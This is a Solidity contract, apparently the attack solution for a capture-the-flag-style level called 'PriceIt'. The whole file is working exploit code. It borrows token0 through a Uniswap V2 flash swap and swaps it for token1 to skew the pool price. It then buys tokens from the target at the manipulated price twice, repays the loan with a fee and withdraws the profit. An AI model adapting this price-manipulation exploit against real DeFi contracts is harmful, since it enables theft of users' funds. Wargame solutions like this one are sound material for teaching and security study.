// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';
import '../levels/PriceIt.sol';

contract PriceItAttack {
  IUniswapV2Factory public uniFactory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
  IUniswapV2Router02 public uniRouter = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
  IERC20 token0;
  IERC20 token1;
  IERC20 token2;
  IUniswapV2Pair token0Token2Pair;
  PriceIt level;
  uint256 public amount = 50000 ether;

  function doYourThing(PriceIt _level) external {
    level = _level;
    token0 = level.token0();
    token1 = level.token1();
    token2 = level.token2();
    token0Token2Pair = IUniswapV2Pair(uniFactory.getPair(address(token0), address(token2)));
    bytes memory data = abi.encode(token0, amount);
    IUniswapV2Pair(token0Token2Pair).swap(amount, 0, address(this), data);
  }

  function withdrawToken0() external {
    token0.transfer(msg.sender, token0.balanceOf(address(this)));
  }

  function uniswapV2Call(
    address,
    uint256,
    uint256,
    bytes calldata
  ) external {
    token0.approve(address(uniRouter), amount);
    _swapTwoTokens(token0, token1, amount);
    uint256 token1Balance = IERC20(token1).balanceOf(address(this));
    token1.approve(address(level), token1Balance);
    level.buyToken(token1Balance / 2, token1);
    level.buyToken(token1Balance / 2, token1);
    _returnFlashSwap(address(token0), address(token0Token2Pair), amount);
  }

  function _swapTwoTokens(
    IERC20 _from,
    IERC20 _to,
    uint256 _inputAmount
  ) private {
    address[] memory path = new address[](2);
    path[0] = address(_from);
    path[1] = address(_to);
    _from.approve(address(uniRouter), _inputAmount);
    uniRouter.swapExactTokensForTokens(_inputAmount, 0, path, address(this), block.timestamp);
  }

  function _returnFlashSwap(
    address _tokenBorrow,
    address _pair,
    uint256 _amountTaken
  ) private {
    // about 0.3%
    uint256 fee = ((_amountTaken * 3) / 997) + 1;
    uint256 amountToRepay = _amountTaken + fee;
    IERC20(_tokenBorrow).transfer(_pair, amountToRepay);
  }
}
